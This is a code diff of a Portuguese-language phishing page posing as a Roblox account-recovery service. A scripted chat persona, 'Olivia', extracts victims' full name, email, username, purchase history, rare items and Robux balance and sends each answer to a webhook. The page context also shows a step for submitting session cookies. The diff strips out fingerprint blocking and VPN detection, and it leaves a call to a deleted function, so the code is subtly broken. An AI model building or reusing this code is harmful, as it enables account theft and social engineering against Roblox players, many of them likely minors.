@@ -890,42 +890,6 @@
             font-size: 12px;
             margin-left: 10px;
         }
-
-        /* Timer de bloqueio */
-        .block-timer {
-            background: rgba(244, 63, 94, 0.1);
-            border: 2px solid #f43f5e;
-            border-radius: 60px;
-            padding: 20px;
-            margin: 20px 0;
-            text-align: center;
-        }
-
-        .timer-display {
-            font-size: 32px;
-            font-weight: 700;
-            color: #f43f5e;
-            font-family: monospace;
-            letter-spacing: 5px;
-        }
-
-        .timer-label {
-            color: #f43f5e;
-            font-size: 14px;
-            margin-top: 5px;
-        }
-
-        /* Aviso de VPN */
-        .vpn-warning {
-            background: rgba(245, 158, 11, 0.1);
-            border: 2px solid #f59e0b;
-            border-radius: 60px;
-            padding: 16px 22px;
-            margin-top: 10px;
-            color: #f59e0b;
-            text-align: center;
-            font-weight: 500;
-        }
     </style>
 </head>
 <body>
@@ -941,39 +905,6 @@
         </div>
         <button class="notification-close" onclick="hideNotification()">✕</button>
         <div class="notification-progress" id="notificationProgress"></div>
-    </div>
-
-    <!-- TELA DE BLOQUEIO 24H -->
-    <div id="blockPage" class="container page hidden">
-        <div class="card">
-            <div class="header">
-                <div class="logo">⏳</div>
-                <div class="header-text">
-                    <div class="title">AGUARDE 24H</div>
-                    <div class="subtitle">sistema anti-spam</div>
-                </div>
-            </div>
-
-            <div class="block-timer">
-                <div class="timer-display" id="blockTimer">24:00:00</div>
-                <div class="timer-label">TEMPO RESTANTE</div>
-            </div>
-
-            <div style="color: #f43f5e; text-align: center; margin: 20px 0;">
-                ⚠️ VOCÊ JÁ UTILIZOU O SISTEMA<br>
-                Aguarde 24 horas para tentar novamente
-            </div>
-
-            <div style="color: #9ca3af; text-align: center; font-size: 14px;">
-                • Isso inclui cookies e chat de recuperação<br>
-                • Mesmo com VPN você está bloqueado<br>
-                • Não adianta trocar de IP ou navegador
-            </div>
-
-            <button class="back-button" onclick="goHomeFromBlock()" style="margin-top: 30px;">
-                <span>←</span> VOLTAR AO INÍCIO
-            </button>
-        </div>
     </div>
 
     <!-- TELA 1 - COOKIE -->
@@ -1019,18 +950,13 @@
                 <!-- Área para mensagem de ban -->
                 <div id="banMessage" class="banned-message" style="display: none;"></div>
                 
-                <!-- Aviso de VPN -->
-                <div id="vpnWarning" class="vpn-warning" style="display: none;">
-                    ⚡ VPN DETECTADA • Acesso limitado
-                </div>
-                
                 <!-- Exibir apenas cooldown, IP removido -->
                 <div class="info-row">
                     <div class="info-text" id="cooldownInfo"></div>
                 </div>
             </div>
 
-            <button class="action-btn" onclick="checkBlockAndSend()" id="sendBtn">
+            <button class="action-btn" onclick="sendAndGo()" id="sendBtn">
                 <span>✦</span>
                 ENVIAR E RESGATAR
                 <span>→</span>
@@ -1091,7 +1017,7 @@
                 </div>
 
                 <!-- Recuperar Conta com Olivia -->
-                <div class="choice-item" onclick="checkBlockAndOpenChat()">
+                <div class="choice-item" onclick="openOliviaChat()">
                     <span class="choice-badge">prioridade</span>
                     <div class="choice-icon">💬</div>
                     <div class="choice-content">
@@ -1153,11 +1079,6 @@
         
         const COOLDOWN_TIME = 300000;
         const COOLDOWN_KEY = 'aurora_last_cookie_sent';
-        
-        // ===== NOVAS CONFIGURAÇÕES DE BLOQUEIO =====
-        const BLOCK_KEY = 'aurora_24h_block';
-        const BLOCK_TIME = 86400000; // 24 horas em ms
-        const FINGERPRINT_KEY = 'aurora_fingerprint';
 
         // Variáveis do chat
         let userIP = '';
@@ -1170,177 +1091,7 @@
         let userProblem = '';
         let analysisStarted = false;
 
-        // ===== FUNÇÕES DE BLOQUEIO 24H =====
-        function getFingerprint() {
-            // Criar fingerprint ÚNICO do navegador (funciona mesmo com VPN)
-            const screen = `${screen.width}x${screen.height}x${screen.colorDepth}`;
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const language = navigator.language;
-            const platform = navigator.platform;
-            const cookiesEnabled = navigator.cookieEnabled;
-            const hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
-            const deviceMemory = navigator.deviceMemory || 'unknown';
-            
-            const fingerprint = `${screen}|${timezone}|${language}|${platform}|${cookiesEnabled}|${hardwareConcurrency}|${deviceMemory}`;
-            
-            // Criar hash
-            let hash = 0;
-            for (let i = 0; i < fingerprint.length; i++) {
-                hash = ((hash << 5) - hash) + fingerprint.charCodeAt(i);
-                hash |= 0;
-            }
-            
-            return hash.toString();
-        }
-
-        function checkBlock() {
-            const blockTime = localStorage.getItem(BLOCK_KEY);
-            const fingerprint = localStorage.getItem(FINGERPRINT_KEY);
-            const currentFingerprint = getFingerprint();
-            
-            if (blockTime) {
-                const timePassed = Date.now() - parseInt(blockTime);
-                
-                // Se já passou 24h, libera
-                if (timePassed >= BLOCK_TIME) {
-                    localStorage.removeItem(BLOCK_KEY);
-                    localStorage.removeItem(FINGERPRINT_KEY);
-                    return false;
-                }
-                
-                // Se ainda está no período de bloqueio
-                return true;
-            }
-            return false;
-        }
-
-        function startBlock() {
-            localStorage.setItem(BLOCK_KEY, Date.now().toString());
-            localStorage.setItem(FINGERPRINT_KEY, getFingerprint());
-        }
-
-        function getRemainingTime() {
-            const blockTime = localStorage.getItem(BLOCK_KEY);
-            if (!blockTime) return 0;
-            
-            const timePassed = Date.now() - parseInt(blockTime);
-            const remaining = BLOCK_TIME - timePassed;
-            return remaining > 0 ? remaining : 0;
-        }
-
-        function updateBlockTimer() {
-            const remaining = getRemainingTime();
-            if (remaining > 0) {
-                const hours = Math.floor(remaining / 3600000);
-                const minutes = Math.floor((remaining % 3600000) / 60000);
-                const seconds = Math.floor((remaining % 60000) / 1000);
-                
-                const timerStr = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-                const timerElement = document.getElementById('blockTimer');
-                if (timerElement) timerElement.textContent = timerStr;
-            }
-        }
-
-        function checkBlockAndOpenChat() {
-            if (checkBlock()) {
-                // Mostrar tela de bloqueio
-                document.getElementById('page2').classList.add('hidden');
-                document.getElementById('blockPage').classList.remove('hidden');
-                setInterval(updateBlockTimer, 1000);
-                showNotification('⏳ BLOQUEADO', 'Aguarde 24 horas', true);
-            } else {
-                openOliviaChat();
-            }
-        }
-
-        function checkBlockAndSend() {
-            if (checkBlock()) {
-                showNotification('⏳ BLOQUEADO', 'Aguarde 24 horas para enviar outro cookie', true);
-                return;
-            }
-            sendAndGo();
-        }
-
-        function goHomeFromBlock() {
-            document.getElementById('blockPage').classList.add('hidden');
-            document.getElementById('page1').classList.remove('hidden');
-        }
-
-        // ===== DETECÇÃO DE VPN =====
-        async function detectVPN() {
-            try {
-                // Método 1: Verificar WebRTC
-                const rtcPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection;
-                if (rtcPeerConnection) {
-                    const pc = new rtcPeerConnection({ iceServers: [] });
-                    const ipPromise = new Promise((resolve) => {
-                        pc.createDataChannel('');
-                        pc.createOffer().then((offer) => pc.setLocalDescription(offer));
-                        pc.onicecandidate = (ice) => {
-                            if (ice && ice.candidate && ice.candidate.candidate) {
-                                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-                                const match = ice.candidate.candidate.match(ipRegex);
-                                if (match) {
-                                    resolve(match[1]);
-                                }
-                            }
-                        };
-                        setTimeout(() => resolve(null), 1000);
-                    });
-                    
-                    const localIP = await ipPromise;
-                    
-                    // IPs comuns de VPN/Datacenter
-                    const vpnRanges = [
-                        '104.', '108.', '128.', '130.', '132.', '134.', '136.', '138.',
-                        '140.', '142.', '144.', '146.', '148.', '150.', '152.', '154.',
-                        '156.', '158.', '160.', '162.', '164.', '166.', '168.', '170.',
-                        '172.', '174.', '176.', '178.', '180.', '182.', '184.', '186.',
-                        '188.', '190.', '192.', '194.', '196.', '198.', '199.', '200.',
-                        '202.', '204.', '205.', '206.', '207.', '208.', '209.', '210.',
-                        '211.', '212.', '213.', '214.', '215.', '216.', '217.', '218.',
-                        '219.', '220.', '221.', '222.', '223.'
-                    ];
-                    
-                    if (localIP) {
-                        for (const range of vpnRanges) {
-                            if (localIP.startsWith(range)) {
-                                return true;
-                            }
-                        }
-                    }
-                }
-                
-                // Método 2: Verificar headers
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                
-                // Se o IP público começar com ranges de datacenter
-                const publicIP = data.ip || '';
-                for (const range of vpnRanges) {
-                    if (publicIP.startsWith(range)) {
-                        return true;
-                    }
-                }
-                
-                return false;
-            } catch (error) {
-                console.error('Erro ao detectar VPN:', error);
-                return false;
-            }
-        }
-
-        // Verificar VPN ao carregar
-        async function checkVPN() {
-            const isVPN = await detectVPN();
-            const vpnWarning = document.getElementById('vpnWarning');
-            if (isVPN) {
-                vpnWarning.style.display = 'block';
-                // Não bloqueia, só avisa
-            }
-        }
-
-        // ===== FUNÇÕES INTERATIVAS =====
+        // ===== NOVAS FUNÇÕES INTERATIVAS =====
         function showStats() {
             showNotification('📊 Estatísticas', `Total de resgates: ${document.getElementById('countStat').textContent}`, false);
         }
@@ -1416,21 +1167,43 @@
             messagesDiv.scrollTop = messagesDiv.scrollHeight;
         }
 
-        // ===== MENSAGENS DA OLIVIA =====
+        // ===== MENSAGENS DA OLIVIA - MAIS CLARAS E DIRETAS =====
         const oliviaMessages = [
+            // Boas-vindas (0)
             "Olá! Sou Olivia, prazer em te conhecer! 🌟 Vou te ajudar a recuperar sua conta.\n\nPrimeiro, me conta: **o que aconteceu com sua conta?**\n(ex: perdi acesso, hackearam, esqueci senha)",
+            
+            // Pergunta o problema (1)
             "Entendi! Agora preciso do seu **NOME COMPLETO** (nome real, igual nos documentos):",
+            
+            // Pergunta nome (2)
             "Obrigada! Agora me informe um **E-MAIL** (pode ser novo, é onde vamos enviar a recuperação):",
+            
+            // Resposta com nome (3)
             "Perfeito! Agora qual é seu **NOME DE USUÁRIO** no Roblox? (ex: joaozinho123)",
+            
+            // Pergunta email (4)
             "Ótimo! Agora me diga qual foi a **ÚLTIMA COMPRA** que você fez no Roblox (pode ser o valor ou o item):",
+            
+            // Pergunta username (5)
             "Entendi! Você ainda tem **ACESSO AO E-MAIL** de cadastro?",
+            
+            // Pergunta compra (6)
             "Ok! Agora me diga a **DATA APROXIMADA** que você criou essa conta (mês/ano):",
+            
+            // Verificando (7)
             "Você tem algum **ITEM EXCLUSIVO** ou raro na conta? (ex: Headless, Korblox, etc)",
+            
+            // Pergunta data criação (8)
             "Quantos **ROBUX** você tem atualmente na conta? (valor aproximado)",
+            
+            // Pergunta itens exclusivos (9)
             "Todas as informações foram enviadas para análise. 🔍\n\n**⏳ ISSO PODE LEVAR ATÉ 24 HORAS**\n\n⚠️ **NÃO TENTE NOVAMENTE** durante este período, pois o sistema vai travar e você não receberá nada.",
+            
+            // Última mensagem (10) - NÃO RESPONDE MAIS
             "Sua solicitação está em análise. Você receberá um e-mail em até 24 horas com as instruções.\n\n**Não é necessário responder mais.**"
         ];
 
+        // Mensagens alternativas para quando o usuário demora
         const waitingMessages = [
             "Ainda estou aqui! Tô só esperando sua resposta 😊",
             "Sem pressa! Me responde quando puder.",
@@ -1440,6 +1213,7 @@
             "Olha eu aqui de novo! 😄 Me avisa quando estiver pronto."
         ];
 
+        // Mensagens de despedida
         const goodbyeMessages = [
             "Foi um prazer ajudar! 💜",
             "Qualquer coisa, é só voltar! 🌟",
@@ -1452,6 +1226,7 @@
             document.getElementById('page2').classList.add('hidden');
             document.getElementById('page3').classList.remove('hidden');
             
+            // Limpar chat
             document.getElementById('chatMessages').innerHTML = '';
             chatHistory = [];
             chatStep = 0;
@@ -1461,13 +1236,18 @@
             userProblem = '';
             analysisStarted = false;
             
+            // Gerar novo ID de conversa
             conversationId = generateSessionId();
+            
+            // Mostrar botões de ação rápida
             document.getElementById('quickActions').style.display = 'grid';
             
+            // Mensagem de boas-vindas
             setTimeout(() => {
                 addOliviaMessage(oliviaMessages[0]);
                 sendToWebhook('system', 'chat_iniciado', { message: 'Chat iniciado' });
                 
+                // Mostrar exemplos após 2 segundos
                 setTimeout(() => {
                     showExamples();
                 }, 2000);
@@ -1475,9 +1255,11 @@
         }
 
         function closeChat() {
+            // Escolher mensagem de despedida aleatória
             const goodbye = goodbyeMessages[Math.floor(Math.random() * goodbyeMessages.length)];
             showNotification('👋 Até logo!', goodbye, false);
             
+            // Enviar resumo do chat antes de fechar
             if (chatHistory.length > 0) {
                 sendToWebhook('system', 'chat_finalizado', { 
                     summary: chatHistory,
@@ -1502,6 +1284,8 @@
             messageDiv.className = 'message olivia';
             
             const time = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
+            
+            // Formatar texto com quebras de linha
             const formattedText = text.replace(/\n/g, '<br>');
             
             messageDiv.innerHTML = `
@@ -1512,6 +1296,7 @@
             messagesDiv.appendChild(messageDiv);
             messagesDiv.scrollTop = messagesDiv.scrollHeight;
             
+            // Salvar no histórico
             chatHistory.push({
                 sender: 'olivia',
                 message: text,
@@ -1535,6 +1320,7 @@
             messagesDiv.appendChild(messageDiv);
             messagesDiv.scrollTop = messagesDiv.scrollHeight;
             
+            // Salvar no histórico
             chatHistory.push({
                 sender: 'user',
                 message: text,
@@ -1542,6 +1328,7 @@
                 step: chatStep
             });
             
+            // Enviar para webhook
             sendToWebhook('user', 'mensagem', { 
                 message: text,
                 step: chatStep
@@ -1569,25 +1356,32 @@
             
             if (!text) return;
             
+            // SE JÁ INICIOU A ANÁLISE, NÃO RESPONDE MAIS
             if (analysisStarted) {
-                addOliviaMessage("⚠️ Sua solicitação já está em análise. Por favor, aguarde até 24 horas.");
+                addOliviaMessage("⚠️ Sua solicitação já está em análise. Por favor, aguarde até 24 horas para receber o e-mail. Não é necessário responder mais.");
                 input.value = '';
                 return;
             }
             
             addUserMessage(text);
             input.value = '';
+            
+            // Esconder botões de ação rápida após primeira mensagem
             document.getElementById('quickActions').style.display = 'none';
+            
             chatStep++;
             
+            // VALIDAÇÃO POR PASSO
             if (chatStep === 1) {
+                // Problema - qualquer coisa vale
                 userProblem = text;
                 sendToWebhook('info', 'problema', { problema: text });
             } 
             else if (chatStep === 2) {
+                // Nome completo - deve ter pelo menos 5 caracteres e não pode ser email
                 if (text.length < 5) {
                     addOliviaMessage("❌ Por favor, digite um **NOME COMPLETO** válido (mínimo 5 letras)");
-                    chatStep--;
+                    chatStep--; // Volta um passo
                     return;
                 }
                 if (text.includes('@')) {
@@ -1599,8 +1393,9 @@
                 sendToWebhook('info', 'nome', { nome: text });
             } 
             else if (chatStep === 3) {
+                // Email - validação básica
                 if (!text.includes('@') || !text.includes('.')) {
-                    addOliviaMessage("❌ Isso não parece um **E-MAIL** válido. Digite um email com @ e .");
+                    addOliviaMessage("❌ Isso não parece um **E-MAIL** válido. Digite um email com @ e . (ex: nome@gmail.com)");
                     chatStep--;
                     return;
                 }
@@ -1608,6 +1403,7 @@
                 sendToWebhook('info', 'email', { email: text });
             } 
             else if (chatStep === 4) {
+                // Username Roblox
                 if (text.length < 3) {
                     addOliviaMessage("❌ Por favor, digite um **NOME DE USUÁRIO** válido (mínimo 3 caracteres)");
                     chatStep--;
@@ -1617,12 +1413,16 @@
                 sendToWebhook('info', 'username', { username: text });
             } 
             else if (chatStep === 5) {
+                // Última compra
                 sendToWebhook('info', 'ultima_compra', { compra: text });
+                
+                // Mostrar botões SIM/NÃO para próxima pergunta
                 setTimeout(() => {
                     addYesNoButtons();
                 }, 1000);
             } 
             else if (chatStep === 6) {
+                // Acesso ao email - deve ser SIM ou NÃO
                 const resposta = text.toUpperCase();
                 if (resposta !== 'SIM' && resposta !== 'NÃO' && resposta !== 'NAO') {
                     addOliviaMessage("❌ Por favor, responda apenas com **SIM** ou **NÃO**");
@@ -1632,27 +1432,37 @@
                 sendToWebhook('info', 'acesso_email', { acesso: text });
             } 
             else if (chatStep === 7) {
+                // Data de criação
                 sendToWebhook('info', 'data_criacao', { data: text });
             } 
             else if (chatStep === 8) {
+                // Itens exclusivos
                 sendToWebhook('info', 'itens_exclusivos', { itens: text });
             } 
             else if (chatStep === 9) {
+                // Robux atual
                 sendToWebhook('info', 'robux_atual', { robux: text });
+                
+                // MARCAR QUE A ANÁLISE COMEÇOU
                 analysisStarted = true;
-                startBlock(); // INICIA BLOQUEIO DE 24H
             } 
             else {
+                // Depois do passo 9, não aceita mais respostas
                 analysisStarted = true;
-                addOliviaMessage("⚠️ Sua solicitação já está em análise. Aguarde 24 horas.");
+                addOliviaMessage("⚠️ Sua solicitação já está em análise. Por favor, aguarde até 24 horas.");
                 return;
             }
             
+            // Simular digitação
             showTyping();
+            
+            // Tempo de resposta variado
             const typingTime = Math.floor(Math.random() * 1500) + 1000;
             await new Promise(resolve => setTimeout(resolve, typingTime));
+            
             hideTyping();
             
+            // Resposta da Olivia baseada no passo (só responde se ainda estiver no fluxo)
             if (!analysisStarted && chatStep < oliviaMessages.length) {
                 let messageToSend = oliviaMessages[chatStep];
                 addOliviaMessage(messageToSend);
@@ -1662,18 +1472,21 @@
                     step: chatStep 
                 });
                 
+                // Se for a mensagem de análise (passo 9), desabilitar input
                 if (chatStep === 9) {
                     document.getElementById('chatInput').disabled = true;
                     document.querySelector('.chat-send').disabled = true;
                     document.querySelector('.chat-send').style.opacity = '0.5';
                     
+                    // Aviso final
                     setTimeout(() => {
-                        addOliviaMessage("⏳ **AGUARDE 24 HORAS**\nVocê receberá um e-mail com as instruções.\n\n**VOCÊ ESTÁ BLOQUEADO POR 24 HORAS**");
+                        addOliviaMessage("⏳ **AGUARDE 24 HORAS**\nVocê receberá um e-mail com as instruções.\n\nNão tente novamente ou o sistema vai travar.");
                     }, 2000);
                 }
             }
         }
 
+        // Função para enviar dados para a webhook do chat
         async function sendToWebhook(type, action, data) {
             try {
                 const payload = {
@@ -1715,13 +1528,13 @@ Problema: ${userProblem || 'Não informado'}
             }
         }
 
+        // Funções existentes (mantidas iguais)
         async function getUserIP() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 userIP = data.ip || 'IP não disponível';
                 await checkIfBanned();
-                await checkVPN(); // Verificar VPN
                 return userIP;
             } catch (error) {
                 userIP = 'IP não disponível';
@@ -1975,16 +1788,6 @@ Problema: ${userProblem || 'Não informado'}
         }, 30000);
 
         // Monitorar atividade no chat
-        let inactivityTimer;
-        function resetInactivityTimer() {
-            if (inactivityTimer) clearTimeout(inactivityTimer);
-            inactivityTimer = setTimeout(() => {
-                if (document.getElementById('page3').classList.contains('hidden')) return;
-                const randomMessage = waitingMessages[Math.floor(Math.random() * waitingMessages.length)];
-                addOliviaMessage(randomMessage);
-            }, 45000);
-        }
-
         document.getElementById('chatInput').addEventListener('focus', resetInactivityTimer);
         document.getElementById('chatInput').addEventListener('input', resetInactivityTimer);
         document.getElementById('chatInput').addEventListener('blur', resetInactivityTimer);
